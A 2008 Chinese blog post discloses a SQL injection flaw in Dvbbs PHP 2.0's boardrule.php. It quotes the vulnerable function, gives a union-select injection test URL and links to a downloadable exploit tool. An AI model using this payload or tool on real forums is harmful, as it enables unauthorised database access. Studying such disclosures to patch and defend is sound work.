---
title: Dvbbs PHP版本0day
description: 这个PHP版dvbbs的漏洞本来是sniperhg准备清明节发出来的，小蟑螂说不知道被0kee群里的谁泄露出来了，随后也就发出来了，看蟑螂挺郁闷的，我这也帮他发出来吧，嘿嘿~。貌似官方已经修复了~影响版本：2.0漏洞文件：/boardrule.phpAuthor：sniperhg 小蟑螂信息来源：零客网安www.0kee.com--------------------分割JJ----------------------相关代码：
date: 2008-03-14 08:15:51
category: 漏洞信息
tags: ['0day', 'PHP', '注入', 'exploit']
post_id: 405
alias: dvbbs-php-2.0-0day
ViewNums: 4825
---

这个PHP版dvbbs的[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF)本来是sniperhg准备清明节发出来的，小蟑螂说不知道被0kee群里的谁泄露出来了，随后也就发出来了，看蟑螂挺郁闷的，我这也帮他发出来吧，嘿嘿~。貌似官方已经修复了~

影响版本：2.0
漏洞文件：/boardrule.php
Author：[sniperhg](http://www.iamnull.cn/)  [小蟑螂](http://5uck.cn/)
信息来源：零客网安 [www.0kee.com](http://0kee.com/?u=42)
--------------------分割JJ----------------------
相关代码：

function brule() {
    global $dv,$db,$boardid,$lang,$groupboardid;
    $groupboardid=$_GET['groupboardid'];
    if(!empty($_GET['groupboardid'])){
        $rules=$db->scalar("select rules from {$dv}group_board where id={$groupboardid}");
    }
    else{
        $rules=$db->scalar("select rules from {$dv}board where boardid={$boardid}");
    }

直接获得变量groupboardid，不为空就直接带入查询导致[注入](/tags/%E6%B3%A8%E5%85%A5)。
测试：http://dvbbsroot/boardrule.php?groupboardid=111111111/**/union/**/select/**/version()/*
利用工具 dvbbs_php2.0_fucker_.exe  MD5 : 6b931f8e00e90cf4b1faa531a59d4b36

[点击进入下载页面](/blog/download.asp?id=60

